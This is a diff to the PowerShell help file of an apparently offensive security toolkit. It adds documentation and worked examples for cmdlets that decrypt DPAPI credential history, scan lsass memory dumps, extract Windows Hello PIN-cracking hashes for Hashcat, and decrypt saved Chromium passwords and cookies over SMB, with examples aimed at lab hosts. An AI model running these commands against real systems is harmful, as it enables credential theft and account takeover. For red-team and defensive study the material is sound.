@@ -300,6 +300,103 @@
 
   <command:command>
     <command:details>
+      <command:name>Get-TBODpapiCredHist</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBODpapiCredHist</command:noun>
+      <maml:description>
+        <maml:para>Decrypts DPAPI CREDHIST (credential history) files from user Protect directories and returns historical password hashes.</maml:para>
+        <maml:para>This cmdlet requires user key material (UserPassword or UserNtlmHash) to decrypt the CREDHIST chain.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBODpapiCredHist</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserName</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserPassword</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserNtlmHash</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserName</maml:name>
+        <maml:description>
+          <maml:para>Optional profile directory name filters under Users (wildcards supported).</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserPassword</maml:name>
+        <maml:description>
+          <maml:para>Password used to derive the starting hash for CREDHIST decryption.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserNtlmHash</maml:name>
+        <maml:description>
+          <maml:para>Hex-encoded NT hash (or LM:NT string) used to derive the starting hash for CREDHIST decryption. Only the NT portion is used.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBODpapiCredHist -ServerName corp1-web01.corp1.lab.home-labs.lol -UserPassword 'Passw0rd!'</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts credential history files using a plaintext password.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBODpapiCredHist -ServerName corp1-web01.corp1.lab.home-labs.lol -UserNtlmHash '0123456789abcdef0123456789abcdef'</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts credential history files using an NT hash (no plaintext password required).</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBODpapiCredHist -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName jsmith -UserPassword 'Passw0rd!'</maml:code>
+        <maml:remarks>
+          <maml:para>Limits enumeration to specific profile directory names under Users.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
       <command:name>Get-TBODpapiMasterKeyHashes</command:name>
       <command:verb>Get</command:verb>
       <command:noun>TBODpapiMasterKeyHashes</command:noun>
@@ -470,6 +567,419 @@
         <maml:code>Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Microsoft -Recurse</maml:code>
         <maml:remarks>
           <maml:para>Scans registry values under the specified key for DPAPI blob headers.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBODpapiMemoryDump</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBODpapiMemoryDump</command:noun>
+      <maml:description>
+        <maml:para>Scans a dump file for embedded DPAPI blobs (and optionally attempts decryption).</maml:para>
+        <maml:para>This cmdlet performs a byte-pattern scan and does not parse or decompress dump formats. Results depend on the dump including the DPAPI blob bytes contiguously.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBODpapiMemoryDump</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="1">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Target server name (used for SMB/local-mode file access and optional per-session DPAPI master key cache lookup).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="1">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>UNC path or TBO.Smb2 drive path to the memory dump file to scan.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Decrypt</maml:name>
+        <maml:description>
+          <maml:para>Attempt to parse and decrypt matching DPAPI blobs when master keys are available.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>DPAPI master key objects (from Get-TBODpapiMasterKeys). Entries are matched by MasterKeyGuid.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ChunkBytes</maml:name>
+        <maml:description>
+          <maml:para>Read chunk size when streaming the dump (default: 4MB).</maml:para>
+        </maml:description>
+        <command:parameterValue>Int32</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>MaxBlobBytes</maml:name>
+        <maml:description>
+          <maml:para>Maximum bytes to capture after a DPAPI hit for parsing/decryption (default: 64KB).</maml:para>
+        </maml:description>
+        <command:parameterValue>Int32</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>MaxHits</maml:name>
+        <maml:description>
+          <maml:para>Maximum number of DPAPI blob header hits to emit before stopping.</maml:para>
+        </maml:description>
+        <command:parameterValue>Int32</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Entropy</maml:name>
+        <maml:description>
+          <maml:para>Optional hex-encoded entropy bytes to pass to DPAPI blob decryption.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>EntropyBytes</maml:name>
+        <maml:description>
+          <maml:para>Optional entropy bytes to pass to DPAPI blob decryption.</maml:para>
+        </maml:description>
+        <command:parameterValue>Byte[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeRawBytes</maml:name>
+        <maml:description>
+          <maml:para>Include the raw DPAPI blob bytes for each hit when parsing succeeds.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Cache</maml:name>
+        <maml:description>
+          <maml:para>Cache DPAPI blob hits (and any decrypted cleartext that looks like text) for later triage/export.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CachePath</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp</maml:code>
+        <maml:remarks>
+          <maml:para>Scans the memory dump for DPAPI blob headers.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>$keys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp -Decrypt -MasterKeys $keys</maml:code>
+        <maml:remarks>
+          <maml:para>Attempts to decrypt DPAPI blobs found in the dump using a provided master key set.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Windows\MEMORY.DMP -MaxHits 200</maml:code>
+        <maml:remarks>
+          <maml:para>Scans a large dump file and stops after a fixed number of hits.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBONGCInfo</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBONGCInfo</command:noun>
+      <maml:description>
+        <maml:para>Parses Windows Hello for Business / NGC container metadata.</maml:para>
+        <maml:para>Reads the system Ngc folder under Windows\ServiceProfiles\LocalService and returns per-container info plus optional protector/item details.</maml:para>
+        <maml:para>Protector payloads (15.dat) can be included for offline tooling flows.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBONGCInfo</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Snapshot</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeProtectors</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeItems</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeProtectorData</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Target server name (used for SMB/local-mode file access).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Snapshot</maml:name>
+        <maml:description>
+          <maml:para>@GMT- snapshot token used to read files from a VSS shadow copy.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeProtectors</maml:name>
+        <maml:description>
+          <maml:para>Include parsed Protector entries in the output.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeItems</maml:name>
+        <maml:description>
+          <maml:para>Include parsed Item entries in the output.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeProtectorData</maml:name>
+        <maml:description>
+          <maml:para>Include protector 15.dat payloads (InputData) as hex.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol</maml:code>
+        <maml:remarks>
+          <maml:para>Enumerates Windows Hello NGC containers for all configured users.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol -IncludeProtectors -IncludeItems</maml:code>
+        <maml:remarks>
+          <maml:para>Includes parsed protector and item details.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol -IncludeProtectors -IncludeProtectorData |
+  Select-Object NgcGuid, UserSid, KeyStorageProviderGuid1, InputDataLength, KeyStorageProviderGuid2</maml:code>
+        <maml:remarks>
+          <maml:para>Includes protector payloads (InputData) and selects common summary fields.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBONGCCryptoKeys</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBONGCCryptoKeys</command:noun>
+      <maml:description>
+        <maml:para>Enumerates Windows Hello / NGC-related Crypto\Keys entries and extracts PIN cracking material.</maml:para>
+        <maml:para>Reads the LocalService Crypto\Keys directory and correlates key GUIDs with NGC containers (GUID1/GUID2). Decrypts private key properties to extract PBKDF2 salt/rounds and can emit Hashcat mode 28100 ($WINHELLO$) lines.</maml:para>
+        <maml:para>Best-effort private key DPAPI decryption can be attempted for non-PIN protected keys, and for PIN-protected software keys when -Pin is supplied.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBONGCCryptoKeys</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Snapshot</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CryptoKeysPath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeAllKeys</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>IncludeHashcat</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>TryDecryptPrivateKey</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Pin</maml:name>
+          <command:parameterValue>SecureString</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>KeyGuid</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Target server name (used for SMB/local-mode file access).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Snapshot</maml:name>
+        <maml:description>
+          <maml:para>@GMT- snapshot token used to read files from a VSS shadow copy.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CryptoKeysPath</maml:name>
+        <maml:description>
+          <maml:para>Share-relative path to the Crypto\Keys directory (default: Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>Machine-scope DPAPI master keys (from Get-TBODpapiMasterKeys -Scope Machine).</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeAllKeys</maml:name>
+        <maml:description>
+          <maml:para>Include all Crypto\Keys entries even when a key does not match any NGC GUID mapping.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>IncludeHashcat</maml:name>
+        <maml:description>
+          <maml:para>Include Hashcat 28100 ($WINHELLO$) lines when PBKDF2 parameters are present.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>TryDecryptPrivateKey</maml:name>
+        <maml:description>
+          <maml:para>Attempt best-effort DPAPI decryption of the private key blob using CNG entropy. For PIN-protected software keys, also supply -Pin.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Pin</maml:name>
+        <maml:description>
+          <maml:para>Windows Hello PIN used to derive smartCardSecret for PIN-protected (software) private keys. Only used with -TryDecryptPrivateKey.</maml:para>
+        </maml:description>
+        <command:parameterValue>SecureString</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>KeyGuid</maml:name>
+        <maml:description>
+          <maml:para>Filter by one or more key GUIDs.</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$mk = Get-TBORegLsaSecrets -ServerName corp1-wks01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk</maml:code>
+        <maml:remarks>
+          <maml:para>Correlates NGC container GUIDs with Crypto\Keys entries and extracts PBKDF2 parameters.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -IncludeHashcat |
+  Where-Object Hashcat28100 |
+  Select-Object -ExpandProperty Hashcat28100 |
+  Out-File -Encoding ascii winhello.hc28100</maml:code>
+        <maml:remarks>
+          <maml:para>Emits Hashcat 28100 lines for offline PIN cracking.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -KeyGuid '{01234567-89ab-cdef-0123-456789abcdef}' -IncludeHashcat</maml:code>
+        <maml:remarks>
+          <maml:para>Filters output to a specific key GUID.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 4 --------------------------</command:title>
+        <maml:code>$pin = Read-Host -AsSecureString 'Windows Hello PIN'
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -TryDecryptPrivateKey -Pin $pin |
+  Where-Object PrivateKeyDecrypted |
+  Select-Object CryptoKeyGuid, NgcGuid, PrivateKeyMasterKeyGuid, PrivateKeyCleartextHex</maml:code>
+        <maml:remarks>
+          <maml:para>Attempts PIN-based decryption of PIN-protected (software) private keys.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -746,7 +1256,7 @@ Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -Mast
       <command:verb>Get</command:verb>
       <command:noun>TBOChromeLogins</command:noun>
       <maml:description>
-        <maml:para>Reads Chrome's Login Data SQLite database over SMB and decrypts saved passwords.</maml:para>
+        <maml:para>Reads a Chromium-based browser's Login Data SQLite database over SMB and decrypts saved passwords.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -761,8 +1271,16 @@ Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -Mast
           <command:parameterValue>String</command:parameterValue>
         </command:parameter>
         <command:parameter required="false">
+          <maml:name>Browser</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
           <maml:name>ProfileName</maml:name>
           <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>AllProfiles</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
         </command:parameter>
         <command:parameter required="false">
           <maml:name>UserName</maml:name>
@@ -790,11 +1308,26 @@ Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -Mast
         <command:parameterValue>String</command:parameterValue>
       </command:parameter>
       <command:parameter>
-        <maml:name>ProfileName</maml:name>
+        <maml:name>Browser</maml:name>
         <maml:description>
-          <maml:para>Chrome profile folder name under User Data (default: Default).</maml:para>
+          <maml:para>Which Chromium browser to target (default: Chrome). Valid values: Chrome, Edge, Brave, Chromium.</maml:para>
         </maml:description>
         <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ProfileName</maml:name>
+        <maml:description>
+          <maml:para>Browser profile folder name under User Data (default: Default).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>AllProfiles</maml:name>
+        <maml:description>
+          <maml:para>Enumerate all browser profile folders under User Data (Default, Profile *, Guest Profile, System Profile).</maml:para>
+          <maml:para>When set, ProfileName is ignored.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
       </command:parameter>
       <command:parameter>
         <maml:name>UserName</maml:name>
@@ -822,9 +1355,23 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys 
       </command:example>
       <command:example>
         <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Filters to a specific user and enumerates all Chrome profile folders under User Data.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
         <maml:code>Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -ProfileName 'Profile 2' -MasterKeys $userKeys</maml:code>
         <maml:remarks>
           <maml:para>Filters to a specific user and non-default Chrome profile folder.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 4 --------------------------</command:title>
+        <maml:code>Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -Browser Edge -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Targets Microsoft Edge user profiles instead of Google Chrome.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -836,7 +1383,7 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys 
       <command:verb>Get</command:verb>
       <command:noun>TBOChromeCookies</command:noun>
       <maml:description>
-        <maml:para>Reads Chrome's Cookies SQLite database over SMB and decrypts cookie values.</maml:para>
+        <maml:para>Reads a Chromium-based browser's Cookies SQLite database over SMB and decrypts cookie values.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -851,7 +1398,135 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys 
           <command:parameterValue>String</command:parameterValue>
         </command:parameter>
         <command:parameter required="false">
+          <maml:name>Browser</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
           <maml:name>ProfileName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>AllProfiles</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserName</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Browser</maml:name>
+        <maml:description>
+          <maml:para>Which Chromium browser to target (default: Chrome). Valid values: Chrome, Edge, Brave, Chromium.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ProfileName</maml:name>
+        <maml:description>
+          <maml:para>Browser profile folder name under User Data (default: Default).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>AllProfiles</maml:name>
+        <maml:description>
+          <maml:para>Enumerate all browser profile folders under User Data (Default, Profile *, Guest Profile, System Profile).</maml:para>
+          <maml:para>When set, ProfileName is ignored.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserName</maml:name>
+        <maml:description>
+          <maml:para>Optional user profile filters (wildcards supported).</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>DPAPI master key objects (from Get-TBODpapiMasterKeys). Entries are matched by MasterKeyGuid.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts saved Chrome cookies for accessible user profiles.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Filters to a specific user and enumerates all Chrome profile folders under User Data.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
+  Select-Object HostKey, Name, Value, ExpiresUtc</maml:code>
+        <maml:remarks>
+          <maml:para>Filters to a specific user and selects common fields.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 4 --------------------------</command:title>
+        <maml:code>Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -Browser Edge -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Targets Microsoft Edge user profiles instead of Google Chrome.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOChromiumStateKeys</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOChromiumStateKeys</command:noun>
+      <maml:description>
+        <maml:para>Reads a Chromium-based browser Local State file over SMB and decrypts os_crypt.encrypted_key to obtain the AES state key used for AES-GCM v10/v11 secrets.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOChromiumStateKeys</command:name>
+        <command:parameter required="true" position="0">
